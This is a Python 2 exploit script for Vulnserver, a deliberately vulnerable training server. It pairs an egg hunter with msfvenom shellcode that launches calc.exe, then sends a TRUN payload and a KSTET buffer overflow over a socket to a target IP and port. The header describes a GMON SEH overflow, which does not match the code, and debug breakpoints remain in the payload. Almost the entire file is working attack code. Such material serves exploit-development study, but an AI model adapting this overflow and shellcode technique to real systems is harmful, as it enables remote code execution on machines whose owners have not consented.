#!/usr/bin/env python2

# Exploit Title: Vulnserver SEH OVerflow for GMON command (no DEP, no ASLR)
#                Uses Egg hunter to reach shellcode stored previously using the TRUN command
#		 For some reasons a reverse shellcode doesn't work, while exec calc works
# Date: 02/17/2023
# Exploit Author: NG
# Tested on: Windows 7 Professional Service Pack 1 x86
# CVE : N/A

import socket
import sys
import logging


# Offset calculated with mona pattern_create and mona pattern_offset
offset=70

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/exec cmd=calc.exe -b "\x00\x0a\x0d" -f python -v shellcode
shellcode =  b""
shellcode += b"\xbb\x74\xb9\x7d\xcb\xda\xc2\xd9\x74\x24\xf4"
shellcode += b"\x5a\x29\xc9\xb1\x31\x31\x5a\x13\x83\xea\xfc"
shellcode += b"\x03\x5a\x7b\x5b\x88\x37\x6b\x19\x73\xc8\x6b"
shellcode += b"\x7e\xfd\x2d\x5a\xbe\x99\x26\xcc\x0e\xe9\x6b"
shellcode += b"\xe0\xe5\xbf\x9f\x73\x8b\x17\xaf\x34\x26\x4e"
shellcode += b"\x9e\xc5\x1b\xb2\x81\x45\x66\xe7\x61\x74\xa9"
shellcode += b"\xfa\x60\xb1\xd4\xf7\x31\x6a\x92\xaa\xa5\x1f"
shellcode += b"\xee\x76\x4d\x53\xfe\xfe\xb2\x23\x01\x2e\x65"
shellcode += b"\x38\x58\xf0\x87\xed\xd0\xb9\x9f\xf2\xdd\x70"
shellcode += b"\x2b\xc0\xaa\x82\xfd\x19\x52\x28\xc0\x96\xa1"
shellcode += b"\x30\x04\x10\x5a\x47\x7c\x63\xe7\x50\xbb\x1e"
shellcode += b"\x33\xd4\x58\xb8\xb0\x4e\x85\x39\x14\x08\x4e"
shellcode += b"\x35\xd1\x5e\x08\x59\xe4\xb3\x22\x65\x6d\x32"
shellcode += b"\xe5\xec\x35\x11\x21\xb5\xee\x38\x70\x13\x40"
shellcode += b"\x44\x62\xfc\x3d\xe0\xe8\x10\x29\x99\xb2\x7e"
shellcode += b"\xac\x2f\xc9\xcc\xae\x2f\xd2\x60\xc7\x1e\x59"
shellcode += b"\xef\x90\x9e\x88\x54\x6e\xd5\x91\xfc\xe7\xb0"
shellcode += b"\x43\xbd\x65\x43\xbe\x81\x93\xc0\x4b\x79\x60"
shellcode += b"\xd8\x39\x7c\x2c\x5e\xd1\x0c\x3d\x0b\xd5\xa3"
shellcode += b"\x3e\x1e\xb6\x22\xad\xc2\x17\xc1\x55\x60\x68"



if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)

output = s.recv(1024)
print output

buf = "TRUN "
buf += "w00tw00t" 
buf += "\x90\x90\x90\xcc"
buf += shellcode
buf += '\r\n'


s.send(buf)
output = s.recv(1024)
print output


buf  = "KSTET "
buf += "\x90"* 9		# debug
buf += "\xcc"		# debug
buf += egghunter
buf += "\x90" * (offset - (10 + len(egghunter)))
buf += "\xd3\x11\x50\x62" 	#jmp esp 625011d3
buf += "\xeb\xb8\x90\x90"	# jmp back of 72
buf += "D" * 300
buf += '\r\n'


s.send(buf)
output = s.recv(1024)
print output